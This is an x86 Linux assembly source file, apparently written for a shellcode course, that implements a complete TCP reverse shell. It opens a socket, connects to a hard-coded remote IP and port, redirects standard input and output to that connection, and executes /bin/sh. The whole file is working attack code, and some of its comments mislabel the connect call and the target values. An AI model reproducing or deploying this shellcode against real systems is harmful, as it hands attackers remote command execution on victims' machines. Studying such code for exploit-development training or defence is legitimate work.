; Title: Reverse Shell - Linux x86 - TCP
; Author: DeathsPirate
; Twitter: @DeathsPirate
; Web: https://whitehatters.academy
; StudentID: SLAE-734

global _start

section .text

_start:
	;	Setup the socketcall socket creation
	;	int 0x80 with a syscall number of 0x66 (102)
	;	socketcall type = 1
	;	int socket(int domain, int type, int protocol)
	;	socket(2, 1, 0)

	xor eax, eax		; Zero out eax
	mov ebx, eax		; Zero out ebx by moving eax into it
	push eax		; Push our zero value onto the stack
	mov al, 0x66		; Set eax to 102 (Socketcall)
	mov bl, 0x1		; Set ebx to 1 (Socket)
	push byte 0x1	        ; Push 1 onto the stack
	push byte 0x2	        ; Push 2 onto the stack
	mov ecx, esp		; Set ecx to the address of our args
	int 0x80	        ; Make the syscall - socketcall(socket(2, 1, 0))


	;	Setup the socketcall connect 
	;	int 0x80 with a syscall number of 0x66 (102)
	;	socketcall type = 3
	;	int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	;	bind(sockfd=edx, [2, 0x5c11(4444), 0xC0A8D582 ], 16)

	mov edx, eax		; Move the sockfd into edx
	xor eax, eax		; Zero out eax
	mov ebx, eax		; Zero out ebx
	mov al, 0x66		; Set eax to 102 (Socketcall)
	mov bl, 0x3		; Set ebx to 3 (Connect)
	;push dword 0x0100007f	; Push IP onto stack
	;push word 0x5c11	; Push our port on to the stack
	push dword 0x8da9b255	; Push IP onto stack
	push word 0xd6d9	; Push our port on to the stack
	push word 0x2		; Push 2 (AF_INET) onto the stack
	mov ecx, esp		; Save the esp address into ecx
	push 0x10		; push 16 onto the stack (length of args)
	push ecx		; push the esp address we saved earlier onto the stack
	push edx		; push the sockfd address onto the stack
	mov ecx, esp		; Save the new stack address pointer into ecx
	int 0x80		; Make the syscall 


	;       Setup the dup2 calls
        ;       int 0x80 with a syscall number of 0x3f (63)
        ;       int dup2(int oldfd, int newfd);
        ;       dup2(edx, loop from 2 to 0)

        mov ebx, edx            ; Set ebx to the return value of our socket call (the sockfd)
        xor ecx, ecx            ; Zero out ecx
        mov cl, 2               ; Set ecx to 2

loop_dup:
        mov al, 0x3f            ; Set eax to 63 (syscall number for dup2)
        int 0x80                ; Make the syscall
        dec ecx                 ; Decrement ecx (newfd)
        jns loop_dup            ; Loop until ecx is less than 0


	; Call execve
	; int 0x80 with a syscall number of 0xb (11)
	; execve(const char *filename, char *const argv [], char *const envp[])
	; execve(/bin//sh, &/bin//sh, 0)

	xor eax, eax		; Zero out eax
	push eax		; Push 0 onto stack (null terminator)
	push dword 0x68732f2f	; push "//sh"
	push dword 0x6e69622f	; push "/bin" 
	mov ebx, esp		; Set ebx to our stack pointer
	mov ecx, eax		; Set ecx to 0
	mov edx, eax		; Set edx to 0
	mov al, 0xb		; Set eax to 11
	int 0x80		; Make the syscall execve("/bin/sh",0,0)
	
